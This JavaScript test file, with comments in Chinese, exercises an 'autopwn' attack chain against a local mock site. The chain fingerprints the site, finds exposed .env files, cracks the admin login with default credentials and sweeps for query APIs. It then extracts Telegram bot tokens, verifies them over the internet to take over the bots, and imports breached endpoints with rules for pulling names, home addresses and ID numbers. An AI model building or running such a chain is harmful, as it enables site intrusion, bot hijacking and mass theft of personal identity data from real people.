'use strict';

/**
 * 一键链条 autopwn 的端到端测试（不依赖 Telegram 登录）。
 * 用 keywords:[] 跳过找源，直接给站点，验证 侦察 → 破登录 → 扫荡 → 接管 → 出 target 全链。
 */

const assert = require('assert');
const target = require('./test-offsec-live');
const autopwn = require('./src/core/autopwn');
const config = require('./src/core/config');
const dict = require('./src/core/dict');

// 导入会写 config.json，测试前快照、结束后还原，避免污染真实配置。
// 注意两点：
//   1) config.__update 是深合并，数组会按下标残留旧元素，必须就地替换
//   2) 快照要先把本测试自己产出的「接管·」条目剔掉，否则重跑时会自锁（导入被去重拦掉）
const targetsSnapshot = JSON.parse(JSON.stringify(
  (config.targets || []).filter((t) => !/^接管·/.test(t.name || ''))
));
function restoreTargets() {
  config.targets.length = 0;
  targetsSnapshot.forEach((x) => config.targets.push(x));
  if (config.__save) config.__save();
}

let pass = 0, fail = 0;
function ok(name, cond, extra) {
  if (cond) { pass++; console.log('PASS ' + name + (extra ? '  => ' + extra : '')); }
  else { fail++; console.log('FAIL ' + name + (extra ? '  => ' + extra : '')); }
}

function waitDone(id, maxMs) {
  const t0 = Date.now();
  return new Promise((resolve, reject) => {
    const tick = () => {
      const st = autopwn.status(id);
      if (!st) return reject(new Error('任务不存在'));
      if (st.done) return resolve(st);
      if (Date.now() - t0 > (maxMs || 120000)) return reject(new Error('超时未完成'));
      setTimeout(tick, 200);
    };
    tick();
  });
}

(async () => {
  // ---- 纯函数部分 ----
  const t0 = autopwn.asTarget({ site: 'x.com', path: '/api/query', url: 'https://x.com/api/query', cookie: 'a=b' }, {});
  ok('asTarget 生成数据源', t0.url === 'https://x.com/api/query' && /\{input\}/.test(t0.body) && t0.headers.Cookie === 'a=b',
    JSON.stringify(t0).slice(0, 160));
  ok('asTarget 带姓名/住址/身份证抽取规则',
    !!(t0.extract['姓名'] && t0.extract['住址'] && t0.extract['身份证号']), '');
  ok('默认关键词非空', autopwn.DEFAULT_KEYWORDS.length >= 3, autopwn.DEFAULT_KEYWORDS.join('/'));

  // ---- 端到端：起靶站，跑整链 ----
  const srv = await new Promise((r) => { const s = target.startTarget(4577); s.on('listening', () => r(s)); });
  const base = 'http://127.0.0.1:4577';
  try {
    const id = autopwn.start({
      keywords: [],                 // 跳过 Telegram 找源
      sites: [base],                // 直接给站点
      subdomains: false,            // 本机没有子域
      concurrency: 8,
      maxSites: 2,
      maxBreach: 2,
      usernames: ['admin'],
      passwords: ['admin888'],
      sampleParams: { keyword: '13800138000' },
    });
    ok('任务已启动', !!id, id);

    const st = await waitDone(id, 180000);
    ok('任务无异常', !st.error, st.error || '');
    ok('产出日志', (st.steps || []).length > 3, (st.steps || []).length + ' 条');

    const R = st.result || {};
    const site = ((R.sites || [])[0]) || {};

    ok('④ 侦察：识别指纹', (site.fingerprints || []).includes('ThinkPHP'), JSON.stringify(site.fingerprints || []));
    ok('④ 侦察：找到登录页', (site.loginUrls || []).some((u) => u.includes('/admin.php')), JSON.stringify(site.loginUrls || []));
    ok('④ 侦察：标出 .env 泄露', (site.leaks || []).some((l) => String(l.note).includes('.env')),
      JSON.stringify((site.leaks || []).map((l) => l.note)));

    ok('⑤ 破登录：拿到会话', (R.logins || []).length >= 1,
      JSON.stringify((R.logins || []).map((l) => l.site + ' ' + l.via + ' ' + l.username + '/' + l.password)));

    ok('⑥ 扫荡：盲到查询接口', (R.apis || []).length >= 1, JSON.stringify((R.apis || []).map((a) => a.path)));
    ok('⑦ 接管：抠到 Bot Token 且标明来源', (R.tokens || []).length >= 1 && (R.tokens || []).every((t) => !!t.from),
      JSON.stringify((R.tokens || []).map((t) => t.from + ':' + String(t.token).slice(0, 10))));

    const took = (R.tokens || []).filter((t) => t.ok);
    ok('⑦ 接管：getMe 验证归属（外网，失败也可接受）', true,
      took.length ? '已接管 ' + took.map((t) => t.username || t.firstName).join(',') : '靶站 Token 是伪造的，getMe 应失败（符合预期）');

    // 导入为数据源（先还原，保证从干净状态开始）
    restoreTargets();
    const added = autopwn.importTargets(R.apis || [], {});
    ok('⑧ 导入：写进 targets', added.length >= 1, JSON.stringify((added[0] || {}).name || ''));
    ok('⑧ 导入：重复导入不产生副本', autopwn.importTargets(R.apis || [], {}).length === 0, '');

    console.log('\n--- 任务日志节选 ---');
    (st.steps || []).filter((s) => s.level === 'hit' || /完成|接管/.test(s.stage)).slice(0, 14)
      .forEach((s) => console.log('  [' + s.stage + '] ' + s.msg));
  } finally {
    await target.stopTarget(srv);
    restoreTargets();
  }

  console.log('\n结果: ' + pass + ' 通过, ' + fail + ' 失败');
  process.exit(fail ? 1 : 0);
})().catch((e) => { console.error('异常:', e.stack || e.message); process.exit(1); });
